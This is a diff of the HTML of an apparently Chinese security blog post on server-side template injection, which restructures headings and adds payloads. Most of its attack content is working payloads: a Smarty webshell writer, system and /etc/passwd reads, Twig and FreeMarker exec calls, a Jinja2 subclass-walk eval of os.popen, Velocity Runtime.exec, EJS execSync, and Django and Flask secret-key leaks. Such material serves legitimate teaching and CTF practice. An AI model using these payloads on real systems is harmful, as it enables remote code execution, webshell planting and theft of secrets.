@@ -414,13 +414,13 @@
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：2.7k字</p>
+      <p>字数：3k字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
     <a class='notlink'>
       <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
-      <p>时长：12分钟</p>
+      <p>时长：13分钟</p>
     </a>
   </div>
 
@@ -483,7 +483,7 @@
 <h2 id="常见的模板引擎"><a href="#常见的模板引擎" class="headerlink" title="常见的模板引擎"></a>常见的模板引擎</h2><p><strong>各框架模板结构：</strong></p>
 <img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/t01f4792c7d03dd49cc.png" style="zoom:150%;">
 
-<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><h4 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h4><p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)</p>
+<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)</p>
 <p>但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读<a target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty">模板的文档</a>以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法。</p>
 <p><strong><a target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L385">getStreamVariable()</a></strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params">$variable</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $_result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $fp = fopen($variable, <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ($fp) &#123;</span><br><span class="line">        <span class="keyword">while</span> (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            $_result .= $current_line;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $_result;</span><br><span class="line">    &#125;</span><br><span class="line">    $smarty = <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;smarty) ? <span class="keyword">$this</span>-&gt;smarty : <span class="keyword">$this</span>;</span><br><span class="line">    <span class="keyword">if</span> ($smarty-&gt;error_unassigned) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . $variable . <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -500,7 +500,17 @@
 <p>因此我们可以构造payload写个webshell:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,<span class="string">&quot;&lt;?php eval(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::clearConfig())&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h4><p>相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 <code>self::</code> 调用静态变量了，但是 通过<a target="_blank" rel="noopener" href="https://twig.symfony.com/doc/2.x/templates.html">官方文档</a>的查询：Twig 给我们提供了一个 <code>_self</code>, 虽然 <code>_self</code> 本身没有什么有用的方法，但是却有一个 env。</p>
+<p>不同版本又有不同的差别 贴一些payload：</p>
+<p><strong>查看Smarty版本</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;system(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;</span><br><span class="line">&#123;php&#125;phpinfo();&#123;/php&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>读文件</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="built_in">self</span>::getStreamVariable(“file:<span class="comment">///etc/passwd”)&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><p>相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 <code>self::</code> 调用静态变量了，但是 通过<a target="_blank" rel="noopener" href="https://twig.symfony.com/doc/2.x/templates.html">官方文档</a>的查询：Twig 给我们提供了一个 <code>_self</code>, 虽然 <code>_self</code> 本身没有什么有用的方法，但是却有一个 env。</p>
 <img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/Twig_env.png" style="zoom:67%;">
 
 <p>env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置(不知道为什么官方文档没有看到这个方法，后来找到了Twig 的源码中的 environment.php）</p>
@@ -518,7 +528,7 @@
 <p><strong>payload:</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><h4 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">request, *args, **kwargs</span>):</span></span><br><span class="line">    template = <span class="string">&#x27;Hello &#123;user&#125;, This is your email: &#x27;</span> + request.GET.get(<span class="string">&#x27;email&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.format(user=request.user))</span><br></pre></td></tr></table></figure>
+<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">request, *args, **kwargs</span>):</span></span><br><span class="line">    template = <span class="string">&#x27;Hello &#123;user&#125;, This is your email: &#x27;</span> + request.GET.get(<span class="string">&#x27;email&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.format(user=request.user))</span><br></pre></td></tr></table></figure>
 
 <p>注入点很明显就是 email，但是如果我们的能力已经被限制的很死，很难执行命令，但又想获取和 User 有关的配置信息的话，怎么办？</p>
 <p>可以发现我们现在拿到的只有有一个 和user 有关的变量，那就是 request user ，那我们的思路是什么？</p>
@@ -533,7 +543,7 @@
 <p>所以，思路就很明确了：我们只需要通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?email&#x3D;&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br><span class="line"></span><br><span class="line">?email&#x3D;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="Flask-jinja2"><a href="#Flask-jinja2" class="headerlink" title="Flask/jinja2"></a>Flask/jinja2</h4><p>Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2</p>
+<h3 id="Flask-jinja2"><a href="#Flask-jinja2" class="headerlink" title="Flask/jinja2"></a>Flask/jinja2</h3><p>Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2</p>
 <p>举个例子：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(&#x27;/hello-template-injection&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_ssti</span>():</span></span><br><span class="line">    person = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;world&quot;</span>, <span class="string">&#x27;secret&#x27;</span>:<span class="string">&quot;UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person[<span class="string">&#x27;name&#x27;</span>] = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;&#x27;&#x27;</span> % person[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, person=person)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user_file</span>(<span class="params">f_name</span>):</span></span><br><span class="line">    <span class="keyword">with</span> open(f_name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.readlines()</span><br><span class="line">    </span><br><span class="line">app.jinja_env.globals[<span class="string">&#x27;get_user_file&#x27;</span>] = get_user_file</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.debug = <span class="literal">True</span></span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>
 
@@ -567,19 +577,21 @@
 
 
 <p><strong>漏洞成因在于</strong>：<code>render_template_string</code>函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，两个大括号在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把两个大括号包裹的内容当做变量解析替换。</p>
-<h5 id="获取全局配置文件"><a href="#获取全局配置文件" class="headerlink" title="获取全局配置文件"></a>获取全局配置文件</h5><p>config是Flask模版中的一个全局对象，它代表”当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。</p>
+<p><strong>获取全局配置文件</strong></p>
+<p>config是Flask模版中的一个全局对象，它代表”当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;person.secret&#125;&#125;</span><br><span class="line">&#123;&#123;self.__dict__&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>直接用Vlunhub上的exp：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/flask/ssti">https://github.com/vulhub/vulhub/tree/master/flask/ssti</a></p>
+<p><strong>命令执行</strong></p>
+<p>直接用Vlunhub上的exp：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/flask/ssti">https://github.com/vulhub/vulhub/tree/master/flask/ssti</a></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h4><p>参见护网杯的一道题：<a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado">https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado</a></p>
-<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><h4 id="freeMarker"><a href="#freeMarker" class="headerlink" title="freeMarker"></a>freeMarker</h4><p>这个模板主要用于 java ,粗略得知new会导致安全问题，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象</p>
+<h3 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h3><p>参见护网杯的一道题：<a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado">https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado</a></p>
+<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h3 id="freeMarker"><a href="#freeMarker" class="headerlink" title="freeMarker"></a>freeMarker</h3><p>这个模板主要用于 java ,粗略得知new会导致安全问题，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象</p>
 <p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/TIM%E6%88%AA%E5%9B%BE20200216163834.png"></p>
 <p>payload：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br><span class="line"></span><br><span class="line">&lt;#assignob=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h4><p>Velocity 同样是一款备受欢迎的模板语言。然而它没有默认变量列表和 <em>安全问题</em> 页面帮助我们构建 payload。下面展示了 Burp Intruder 在枚举变量名时的截图：（变量名在 payload 行，服务器结果在其右边）：</p>
+<h3 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h3><p>Velocity 同样是一款备受欢迎的模板语言。然而它没有默认变量列表和 <em>安全问题</em> 页面帮助我们构建 payload。下面展示了 Burp Intruder 在枚举变量名时的截图：（变量名在 payload 行，服务器结果在其右边）：</p>
 <img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-variable-bruteforce.png" style="zoom:150%;">
 
 <p>这幅图中，被高亮的 class 能返回对象，看上去十分有趣。谷歌一下，我们发现了<a href="https://link.zhihu.com/?target=https://velocity.apache.org/tools/releases/2.0/summary.html">如下描述</a>：<br>ClassTool：在模板中实现Java的反射，默认参数：$key</p>
@@ -589,6 +601,26 @@
 
 <p>得到 shell 命令输出有点麻烦（毕竟java）：</p>
 <figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#set($str=$class.inspect(&quot;java.lang.String&quot;).type)</span><br><span class="line">#set($chr=$class.inspect(&quot;java.lang.Character&quot;).type)</span><br><span class="line">#set($ex=$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br><span class="line"> </span><br><span class="line"><span class="comment">//输出 tomcat7</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h2><h3 id="EJS"><a href="#EJS" class="headerlink" title="EJS"></a>EJS</h3><p>EJS 是一套简单的模板语言，帮你利用普通的 JavaScript 代码生成 HTML 页面</p>
+<p>文档参见：<a target="_blank" rel="noopener" href="https://ejs.bootcss.com/#docs">https://ejs.bootcss.com/#docs</a></p>
+<p><strong>标签含义</strong></p>
+<ul>
+<li><code>&lt;%</code> ‘脚本’ 标签，用于流程控制，无输出。</li>
+<li><code>&lt;%_</code> 删除其前面的空格符</li>
+<li><code>&lt;%=</code> 输出数据到模板（输出是转义 HTML 标签）</li>
+<li><code>&lt;%-</code> 输出非转义的数据到模板</li>
+<li><code>&lt;%#</code> 注释标签，不执行、不输出内容</li>
+<li><code>&lt;%%</code> 输出字符串 ‘&lt;%’</li>
+<li><code>%&gt;</code> 一般结束标签</li>
+<li><code>-%&gt;</code> 删除紧随其后的换行符</li>
+<li><code>_%&gt;</code> 将结束标签后面的空格符删除</li>
+</ul>
+<p>贴一下payload：</p>
+<p><strong>命令执行</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- <span class="built_in">global</span>.process.mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;cat app.js&#x27;</span>) %&gt;</span><br></pre></td></tr></table></figure>
+
+
 
 <p>参考：</p>
 <p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/</a></p>
@@ -648,10 +680,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-06-14T13:40:16+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-21T22:25:49+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2020年6月14日</p>
+    <p>更新于：2021年2月21日</p>
   </a>
 </div>
 
@@ -797,7 +829,7 @@ writeup题目原型为thinkphp 6.0反序列化，改自于2019高校运维赛ezp
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="toc-text">什么是模板注入？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="toc-text">常见的模板引擎</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP"><span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Smarty"><span class="toc-text">Smarty</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Twig"><span class="toc-text">Twig</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python"><span class="toc-text">Python</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Django"><span class="toc-text">Django</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flask-jinja2"><span class="toc-text">Flask&#x2F;jinja2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%85%A8%E5%B1%80%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-text">获取全局配置文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tornado"><span class="toc-text">Tornado</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java"><span class="toc-text">Java</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#freeMarker"><span class="toc-text">freeMarker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Velocity"><span class="toc-text">Velocity</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="toc-text">什么是模板注入？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="toc-text">常见的模板引擎</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP"><span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Smarty"><span class="toc-text">Smarty</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Twig"><span class="toc-text">Twig</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python"><span class="toc-text">Python</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Django"><span class="toc-text">Django</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flask-jinja2"><span class="toc-text">Flask&#x2F;jinja2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tornado"><span class="toc-text">Tornado</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java"><span class="toc-text">Java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#freeMarker"><span class="toc-text">freeMarker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Velocity"><span class="toc-text">Velocity</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Node-js"><span class="toc-text">Node.js</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EJS"><span class="toc-text">EJS</span></a></li></ol></li></ol>
     </div>
   </section>
 
